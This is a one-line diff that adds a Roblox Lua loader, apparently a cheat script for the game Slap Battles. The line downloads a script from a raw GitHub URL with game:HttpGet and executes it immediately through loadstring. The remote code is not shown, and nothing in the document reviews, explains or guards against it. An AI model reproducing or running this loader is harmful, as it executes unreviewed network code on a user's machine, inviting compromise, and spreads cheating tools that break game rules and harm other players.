@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/update-slap-battles-spam0-t53dvkh7o5a43y.lua"))()
